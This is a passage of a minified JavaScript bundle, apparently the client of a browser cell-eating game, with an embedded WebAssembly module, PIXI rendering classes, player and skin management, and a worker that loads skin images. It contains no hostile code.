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"),
                            t = this.instance = await WebAssembly.instantiate(await WebAssembly.compile(await e.arrayBuffer()), {
                                env: {
                                    addOrUpdate(e, t, s, a, n, o, r, l, c) {
                                        let {
                                            playback: h
                                        } = i;
                                        if (h.dry) {
                                            let {
                                                updates: d
                                            } = h, p = d[0][0];
                                            p[a] = {
                                                type: t,
                                                pid: s,
                                                id: a,
                                                x: n,
                                                y: o,
                                                size: r,
                                                flags: l
                                            };
                                            return
                                        }
                                        n = 32 & t ? void 0 : n, r = 64 & t ? void 0 : r, g(15 & t, s, a, n, o, r, l, c, e)
                                    },
                                    destroy(e, t) {
                                        let {
                                            playback: s
                                        } = i;
                                        if (s.dry) {
                                            s.destroyCell(t);
                                            return
                                        }
                                        m(t, e)
                                    },
                                    eat(e, t, s) {
                                        let {
                                            playback: a
                                        } = i;
                                        if (a.dry) {
                                            a.eatCell(t, s);
                                            return
                                        }
                                        A(t, s, e)
                                    },
                                    emscripten_notify_memory_growth(e) {}
                                }
                            }),
                            {
                                memory: s
                            } = t.exports;
                        return this.HEAPU8 = new Uint8Array(s.buffer), this.HEAPU16 = new Uint8Array(s.buffer), this.HEAPF32 = new Uint8Array(s.buffer), this.HEAPU32 = new Uint8Array(s.buffer), delete this.initializing, !0
                    }
                    deserialize(e, t, s) {
                        if (!this.instance) return 0;
                        let {
                            deserialize: i,
                            malloc: a,
                            free: n
                        } = this.instance.exports, o = t.byteLength, r = a(o);
                        this.HEAPU8.set(t, r), i(r, s, e), n(r)
                    }
                };
            v.init(), window.Module = v, i.parseCells = e => v.deserialize(1, new Uint8Array(e.buffer, 1), e.packetId), e.exports = {
                wasmModule: v,
                addOrUpdateCell: g,
                destroyCell: m,
                eatCell: A
            }
        }, function(e, t, s) {
            var i = s(140);

            function a(e, t, s, a) {
                var n = e.length,
                    o = i._malloc(n),
                    r = new Uint8Array(i.HEAPU8.buffer, o, n);
                r.set(e);
                var l = t(o, a);
                if (!s) {
                    var c = new Uint8Array(new ArrayBuffer(n));
                    c.set(r)
                }
                return i._free(o), s ? l : c
            }
            s(141), e.exports = {
                skid: e => a(e, i._skid, !1),
                skid3: (e, t) => a(e, i._skid3, !0, t),
                skid4: (e, t) => a(e, i._skid4, !0, t)
            }
        }, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , function(e, t, s) {
            "use strict";
            var i = s(74),
                a = s(30),
                n = Object((s(168), s(0)).a)(a.default, i.a, i.b, !1, null, "0eaeaf66", null);
            n.options.__file = "src/components/modal.vue", t.default = n.exports
        }, function(e, t, s) {
            "use strict";
            var i = s(75),
                a = s(38),
                n = Object((s(218), s(0)).a)(a.default, i.a, i.b, !1, null, "1dbc6ed9", null);
            n.options.__file = "src/components/replay-item.vue", t.default = n.exports
        }, function(e, t, s) {
            "use strict";
            var i = s(73),
                a = s(55),
                n = Object((s(250), s(0)).a)(a.default, i.a, i.b, !1, null, "4c95bd45", null);
            n.options.__file = "src/components/minimap.vue", t.default = n.exports
        }, function(e, t, s) {
            "use strict";
            s(17).notifyUnsupportedBrowser(), s(1), s(130), s(132), s(142), s(148), s(269), s(267), s(268)
        }, function(e, t, s) {
            var i = s(2),
                a = s(120);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function() {}, function(e, t, s) {
            let i, a = s(4),
                n = s(12),
                o = ({
                    width: e,
                    height: t,
                    circle: s
                }) => {
                    let i = PIXI.utils.string2hex(a.borderColor),
                        n = new PIXI.Graphics;
                    return n.lineStyle(100, i, 1, .5), s ? n.drawEllipse(e / 2, t / 2, e / 2, t / 2) : n.drawRect(0, 0, e, t), n.endFill(), n.pivot.set(e / 2, t / 2), n
                },
                r = ({
                    width: e,
                    height: t
                }) => {
                    let s = new PIXI.Graphics().beginFill(16777215).drawEllipse(e / 2, t / 2, e / 2, t / 2).endFill();
                    return s.pivot.set(e / 2, t / 2), s
                };
            e.exports = class e {
                constructor(e, t) {
                    this.border = e, this.container = new PIXI.Container, this.background = new PIXI.Container, this.borderSprite = o(e), this.background.addChild(this.borderSprite), this.foreground = new PIXI.Container, this.food = new PIXI.Container, this.food.visible = a.foodVisible, this.resetMassTextStyle(!1), this.container.addChild(this.background, this.food, this.foreground), this.setPosition(), t && this.setBackgroundImage(), this.background.position.x = e.x, this.background.position.y = e.y
                }
                static useGame(e) {
                    i = e
                }
                setPosition() {
                    this.container.position.x = window.innerWidth / 2, this.container.position.y = window.innerHeight / 2
                }
                sort() {
                    this.foreground.children.sort((e, t) => (e = e.gameData).size === (t = t.gameData).size ? e.id - t.id : e.size - t.size)
                }
                addCell(e) {
                    this.foreground.addChild(e)
                }
                addFood(e) {
                    this.food.addChild(e)
                }
                toggleBackgroundImage(e) {
                    e && !this.backgroundSprite ? this.setBackgroundImage() : e || this.destroyBackgroundImage(!0)
                }
                setBackgroundImage() {
                    let e = a.backgroundImageUrl;
                    if (!e) {
                        this.destroyBackgroundImage();
                        return
                    }
                    let t = (a.backgroundImageRepeat ? PIXI.TilingSprite : PIXI.Sprite).from(e, {});
                    t.width = this.border.width, t.height = this.border.height, t.alpha = a.backgroundImageOpacity, t.anchor.set(.5);
                    let s = this.backgroundSprite;
                    if (s) {
                        let i = t.texture !== s.texture;
                        this.destroyBackgroundImage(i)
                    }
                    if (this.backgroundSprite = t, this.background.addChildAt(t, 0), !this.border.circle) return;
                    let n = r(this.border);
                    this.background.addChildAt(n, 1), this.backgroundSprite.mask = n
                }
                destroyBackgroundImage(e) {
                    this.backgroundSprite && (this.backgroundSprite.destroy(!!e), delete this.backgroundSprite)
                }
                resetBorder() {
                    this.borderSprite.destroy(), this.borderSprite = o(this.border), this.background.addChild(this.borderSprite)
                }
                reloadFoodTextures() {
                    i.allCells.forEach(e => {
                        e.isFood && e.reloadTexture()
                    })
                }
                reloadEjectedTextures() {
                    i.allCells.forEach(e => {
                        e.isEjected && e.reloadTexture()
                    })
                }
                reloadVirusTexture() {
                    n.virus.loadVirusFromUrl(a.virusImageUrl)
                }
                resetPlayerLongNames() {
                    i.playerManager.players.forEach(e => e.applyNameToSprite())
                }
                resetNameTextStyle() {
                    [...i.allCells.values()].filter(e => !!e.isPlayerCell).forEach(e => {
                        e.nameSprite && (e.nameSprite.destroy(!1), e.nameSprite = null)
                    });
                    let e = a.nameTextStyle;
                    i.playerManager.players.forEach(t => {
                        let s = t.nameSprite;
                        if (!s) return;
                        let i = s.style.fill;
                        s.style = e, s.style.fill = i, s.updateText()
                    })
                }
                resetMassTextStyle(e) {
                    e && this.uninstallMassTextFont();
                    let t = {...a.massTextStyle, fontSize:a.massTextStyle.fontSize*a.rendering_scale, strokeThickness:a.massTextStyle.strokeThickness*a.rendering_scale};
                    for (PIXI.BitmapFont.from("mass", t, {
                            chars: "1234567890k."
                        }); i.massTextPool.length;) i.massTextPool.pop().destroy(!1);
                    [...i.allCells.values()].filter(e => !!e.isPlayerCell).forEach(e => {
                        e.massText && e.sprite && (e.sprite.removeChild(e.massText), e.massText.destroy(!1), e.massText = null)
                    })
                }
                uninstallMassTextFont() {
                    PIXI.BitmapFont.uninstall("mass")
                }
            }
        }, function(e, t, s) {
            var i = s(4),
                a = s(24),
                n = {};
            e.exports = {
                getTexture: function(e) {
                    var t, s, o, r, l, c, h, d;
                    return n[e] || (n[e] = (t = e, (h = (s = c = (l = i.cellSize) / 2, o = t, (r = new PIXI.Graphics).beginFill(o), r.drawCircle(0, 0, s), r.endFill(), r)).position.set(c), 
                        d = i.ultrarender ? (()=>{
                            var base = new PIXI.BaseRenderTexture(l,l, PIXI.SCALE_MODES.LINEAR);
                            baseRenderTexture.mipmap = 2
                            return new PIXI.RenderTexture(base) 
                        })() : (()=>{return PIXI.RenderTexture.create(l, l)})(), a.render(h, d), i.ultrarender ? a.framebuffer.blit() : null, d 
                    ))
                },
                destroyCache: function() {
                    for (var e in n) n[e].destroy(!0), delete n[e]
                }
            }
        }, function(e, t, s) {
            var i = s(4),
                a = s(24),
                n = {};
            e.exports = {
                getTexture: function(e) {
                    var t, s, o, r, l, c, h, d;
                    return n[e] || (n[e] = (t = e, (h = (s = c = (l = i.cellSize) / 2, o = t, (r = new PIXI.Graphics).beginFill(o), r.drawRect(-s, -s, 2 * s, 2 * s), r.endFill(), r)).position.set(c), 
                    d = i.ultrarender ? (()=>{
                        var base = new PIXI.BaseRenderTexture(l,l, PIXI.SCALE_MODES.LINEAR);
                        baseRenderTexture.mipmap = 2
                        return new PIXI.RenderTexture(base) 
                    })() : (()=>{return PIXI.RenderTexture.create(l, l)})(), a.render(h, d), i.ultrarender ? a.framebuffer.blit() : null, d 
                ))
                },
                destroyCache: function() {
                    for (var e in n) n[e].destroy(!0), delete n[e]
                }
            }
        }, function(e, t, s) {
            var i = s(24),
                {
                    loadImage: a
                } = s(8),
                n = PIXI.RenderTexture.create(256, 256),
                o = Promise.resolve();
            e.exports = {
                getTexture: function() {
                    return n
                },
                loadVirusFromUrl: async function(e) {
                    await o, o = new Promise(async t => {
                        var s = await a(e),
                            o = PIXI.Sprite.from(s, void 0, 18);
                        o.width = o.height = 256, i.render(o, n, !0), o.destroy(!0), t()
                    })
                }
            }
        }, function(e, t, s) {
            let i, a = s(126);
            e.exports = class e {
                constructor() {
                    this.playersRemoving = [], this.players = new Map, this.botCount = 0
                }
                static useGame(e) {
                    i = e, a.useGame(e)
                }
                get playerCount() {
                    return this.players.size - this.botCount
                }
                getPlayer(e) {
                    return this.players.has(e) ? this.players.get(e) : null
                }
                setPlayerData({
                    pid: e,
                    nickname: t,
                    skin: s,
                    skinUrl: i,
                    perk_color: n,
                    tagId: o,
                    bot: r
                }) {
                    !this.players.has(e) && (this.players.set(e, new a(e, r)), r && this.botCount++);
                    let l = this.players.get(e);
                    s && (i = `https://skins.vanis.io/s/${s}`);
                    let c = l.setName(t, n),
                        h = l.setSkin(i),
                        d = l.setTagId(o);
                    return (c || h || d) && l.invalidateVisibility(), l
                }
                invalidateVisibility(e = []) {
                    for (let t of this.players.values()) 0 > e.indexOf(t) && t.invalidateVisibility()
                }
                sweepRemovedPlayers() {
                    let {
                        replay: e
                    } = i, t = e.packets[0], s = t[0]?.packetId, a = 0;
                    for (; a < this.playersRemoving.length;) {
                        let n = this.playersRemoving[a];
                        if (!this.players.has(n)) {
                            this.playersRemoving.splice(a, 1);
                            continue
                        }
                        let o = this.players.get(n);
                        s && o.lastUpdateTick && !(s > o.lastUpdateTick) ? a++ : (this.removePlayer(n), this.playersRemoving.splice(a, 1))
                    }
                }
                delayedRemovePlayer(e) {
                    this.playersRemoving.push(e)
                }
                removePlayer(e) {
                    if (!this.players.has(e)) return;
                    let t = this.players.get(e);
                    t.bot && this.botCount--, t.clearCachedData(), this.players.delete(e)
                }
                destroy() {
                    for (let e of this.players.keys()) this.removePlayer(e);
                    this.botCount = 0, this.playersRemoving.splice(0, this.playersRemoving.length)
                }
            }
        }, function(e, t, s) {
            let i = s(4),
                {
                    basic: a,
                    basicd: n
                } = s(76),
                o = i.cellSize,
                r = o / 2,
                l = i.cellBorderSize,
                c = e => {
                    e = e || 0;
                    let t = new PIXI.Graphics().lineStyle(l, 0, .5).beginFill(e).drawCircle(0, 0, r).endFill();
                    return t
                },
                h = null;
            e.exports = class e {
                constructor(e, t) {
                    this.pid = e, this.bot = t || !1, this.skinUrl = null, (e === h.playerId || e === h.multiboxPid) && (this.isMe = !0), this.texture = PIXI.RenderTexture.create(o, o), this.cellContainer = this.createCellContainer(), this.renderCell()
                }
                static useGame(e) {
                    h = e
                }
                get visibility() {
                    return 1 + +(h.tagId !== this.tagId)
                }
                setOutline(e, t = 15, s = !1) {
                    if (this.outlineGraphic && (this.outlineGraphic.destroy(), delete this.outlineGraphic), s) return void this.renderCell();
                    e = e || 0;
                    let i = this.outlineGraphic = new PIXI.Graphics().lineStyle(t, e, 1).drawCircle(0, 0, r - (t - 1) / 2).endFill();
                    i.pivot.set(-r), h.renderer.render(i, this.texture, !1)
                }
                setCrown(e) {
                    this.hasCrown = e;
                    let t = this.pid;
                    h.allCells.forEach(s => {
                        s.isPlayerCell && s.pid === t && (e ? s.addCrown() : s.removeCrown())
                    })
                }
                createCellContainer() {
                    let e = new PIXI.Container;
                    return e.pivot.set(-o / 2), e.addChild(c(this.getCellColor())), e
                }
                createSkinSprite(e) {
                    let t = new PIXI.BaseTexture(e),
                        s = new PIXI.Texture(t),
                        i = new PIXI.Sprite(s);
                    return i.width = i.height = o, i.anchor.set(.5), i
                }
                renderCell() {
                    h.renderer.render(this.cellContainer, this.texture, !0)
                }
                setTagId(e) {
                    return e || (e = null), this.tagId !== e && (this.tagId = e, this.bot || this.setTagSprite(), !0)
                }
                setNameColor(e) {
                    return e = e ? parseInt(e, 16) : null, this.perk_color = e, this.perk_colorCss = e && PIXI.utils.hex2string(e), e
                }
                setName(e, t) {
                    return e || (e = "Unnamed"), (this.nameFromServer !== e || this.color !== t) && (this.nameFromServer = e, this.color = t, this.applyNameToSprite(), !0)
                }
                applyNameToSprite() {
                    let e = "Unnamed" === this.nameFromServer,
                        t = "Long Name" === this.nameFromServer,
                        s = e ? "" : this.nameFromServer,
                        a = this.name,
                        n = this.perk_color,
                        o;
                    if (o = e || t ? this.setNameColor(null) : this.setNameColor(this.bot ? "878787" : this.color), this.setNameSprite(s, o), e || t || !(this.nameSprite.texture.width > i.cellLongNameThreshold*this.rendering_scale) || (t = !0, s = "Long Name", o = this.setNameColor(null), this.setNameSprite(s, o)), this.name = e ? "Unnamed" : s, a !== this.name || n !== this.perk_color) {
                        let r = o || (this.isMe ? 16747520 : null);
                        h.events.$emit("minimap-create-node", this.pid, s, o, r)
                    }
                }
                setNameSprite(e, t) {
                    this.nameSprite ? this.nameSprite.text = e : this.nameSprite = new PIXI.Text(e, {...i.nameTextStyle, strokeThickness:i.nameTextStyle.strokeThickness*i.rendering_scale, fontSize:i.nameTextStyle.fontSize*i.rendering_scale}), this.nameSprite.style.fill = t || 16777215, this.nameSprite.updateText()
                }
                setTagSprite() {
                    let e = `Team ${null==this.tagId?0:this.tagId}`;
                    if (this.tagSprite) this.tagSprite.text = e;
                    else {
                        let t = {
                            ...i.nameTextStyle,
                            strokeThickness:i.nameTextStyle.strokeThickness*i.rendering_scale
                        };
                        t.fontSize = 45*i.rendering_scale, this.tagSprite = new PIXI.Text(e, t)
                    }
                    this.tagSprite.style.fill = this.getTagColor(), this.tagSprite.updateText()
                }
                getTagColor() {
                    if (null != this.tagId) {
                        let e = [6946705, 6946800, 6908927, 16738803, 16768105, 16738665, 16776960, 65280, 65535, 16711935],
                            t = h.seededRandom(this.tagId || 0);
                        return e[Math.floor(t * e.length)]
                    }
                    return 16777215
                }
                setSkin(e) {
                    if ((e = e || null) === this.skinUrl) return !1;
                    this.abortSkinLoaderIfExist();
                    let t = this.destroySkin();
                    return t && this.renderCell(), this.skinUrl = e, this.skinShown && this.loadSkinAndRender(), !0
                }
                destroySkin() {
                    return !!this.skinSprite && (this.skinSprite.mask.destroy(!0), this.skinSprite.destroy(!0), this.skinSprite = null, !0)
                }
                loadSkinAndRender() {
                    this.abortSkinLoaderIfExist(), this.abortSkinLoader = h.skinLoader.loadSkin(this.skinUrl, e => {
                        this.skinSprite = this.createSkinSprite(e), this.skinSprite.mask = c(), this.cellContainer.addChild(this.skinSprite.mask, this.skinSprite), this.renderCell()
                    })
                }
                invalidateVisibility() {
                    let e, t, s;
                    this.isMe ? (e = i.showOwnName, t = i.showOwnSkin, s = i.showOwnMass) : (e = i.showNames >= this.visibility, t = i.showSkins >= this.visibility, s = i.showMass >= this.visibility), e = i.namesEnabled && e, t = i.skinsEnabled && t, s = i.massEnabled && s, t && !this.skinShown ? this.skinSprite ? (this.skinSprite.visible = !0, this.renderCell()) : this.skinUrl && this.loadSkinAndRender() : !t && this.skinShown && (this.abortSkinLoaderIfExist(), this.skinSprite && (this.skinSprite.visible = !1, this.renderCell())), this.nameShown = e, this.skinShown = t, this.massShown = s, this.nameColorShown = i.showNameColor
                }
                abortSkinLoaderIfExist() {
                    this.abortSkinLoader && (this.abortSkinLoader(), this.abortSkinLoader = null)
                }
                getCellColor() {
                    let e = h.seededRandom(this.pid),
                        t = Math.floor(e * a.length);
                    return (this.bot ? n : a)[t]
                }
                clearCachedData() {
                    this.abortSkinLoaderIfExist(), this.destroySkin(), this.cellContainer.destroy(!0), this.texture.clearedFromCache = !0, this.texture.destroy(!0), this.nameSprite && this.nameSprite.destroy(!0), this.tagSprite && this.tagSprite.destroy(!0), h.events.$emit("minimap-destroy-node", this.pid)
                }
            }
        }, , function(e, t, s) {
            let i = s(129),
                a = (e, t) => {
                    let s = e.callbacks.indexOf(t);
                    s >= 0 && e.callbacks.splice(s, 1)
                };
            e.exports = class e {
                constructor() {
                    this.loaders = new Map, this.worker = new i, this.worker.addEventListener("message", this.onSkinLoaded.bind(this))
                }
                createLoader(e) {
                    return {
                        image: null,
                        errored: null,
                        callbacks: [e]
                    }
                }
                clearCallbacks() {
                    this.loaders.clear()
                }
                loadSkin(e, t) {
                    if (!this.loaders.has(e)) {
                        let s = this.createLoader(t);
                        return this.loaders.set(e, s), this.worker.postMessage(e), a.bind(null, s, t)
                    }
                    let i = this.loaders.get(e);
                    if (i.image) t(i.image);
                    else if (!i.errored) return i.callbacks.push(t), a.bind(null, i, t);
                    return null
                }
                onSkinLoaded(e) {
                    let {
                        url: t,
                        image: s,
                        errored: i
                    } = e.data, a = this.loaders.get(t);
                    if (i) a.errored = !0, a.callbacks = [];
                    else {
                        a.image = s;
                        let {
                            callbacks: n
                        } = a;
                        for (; n.length;) n.pop()(s)
                    }
                }
            }
        }, function(e, t, s) {
            let i = atob("YWRkRXZlbnRMaXN0ZW5lcigibWVzc2FnZSIsZT0+e2xldCBzPWUuZGF0YTtmZXRjaChzLHttb2RlOiJjb3JzIn0pLnRoZW4oZT0+ZS5ibG9iKCkpLnRoZW4oZT0+Y3JlYXRlSW1hZ2VCaXRtYXAoZSkpLnRoZW4oZT0+c2VsZi5wb3N0TWVzc2FnZSh7dXJsOnMsaW1hZ2U6ZX0pKS5jYXRjaCgoKT0+c2VsZi5wb3N0TWVzc2FnZSh7dXJsOnMsZXJyb3JlZDohMH0pKX0pOw==");
            e.exports = function() {
                return new Worker(URL.createObjectURL(new Blob([i], {
                    type: "text/javascript"
                })))
            }
        }, function(e, t, i) {
            let a = i(131),
                n = i(1),
                {
                    getTimestamp: o
                } = i(8),
                r = i(5),
                l = i(4),
                c = i(78),
                h = a.createInstance({
                    name: "game-replays"
                }),
                d = e => btoa(String.fromCharCode.apply(null, new Uint8Array(e))),
                p = e => {
                    e = atob(e);
